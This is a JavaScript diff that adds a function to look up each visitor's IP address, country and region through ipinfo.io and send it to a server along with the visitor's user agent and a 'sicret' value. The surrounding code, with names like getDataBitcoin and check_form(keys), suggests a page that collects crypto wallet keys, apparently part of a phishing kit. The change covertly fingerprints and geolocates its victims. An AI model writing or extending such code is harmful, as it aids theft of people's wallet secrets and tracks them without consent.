@@ -204,11 +204,31 @@ async function getDataBitcoin() {
     check_form(keys)
 }
 
+async function getUserInfo() {
+    try {
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+
+        const flagEmoji = getFlagEmoji(data.country);
+
+        return {"ip": data.ip, "country": data.country, "region": data.region, "flag": flagEmoji}
+    } catch (error) {
+        console.error('Error fetching user info:', error);
+    }
+}
+
+function getFlagEmoji(countryCode) {
+    return countryCode.toUpperCase().replace(/./g, char =>
+        String.fromCodePoint(127397 + char.charCodeAt())
+    );
+}
+
 async function get() {
     let users = await send_request("get", false, "users", false)
     let codes = await send_request("get", false, "phone_nubmer_codes", false)
 
     set_phone_numbers(codes)
+    const userLocation = await getUserInfo()
 
     let data = {
         id: users?.length - 1 + 1,
@@ -219,7 +239,8 @@ async function get() {
         userAgent: info?.appVersion(),
         sicret: info?.sicret(),
         sunset: 0,
-        step: 0
+        step: 0,
+        userLocation
     }
 
     send_request("post", true, "new_user", data)
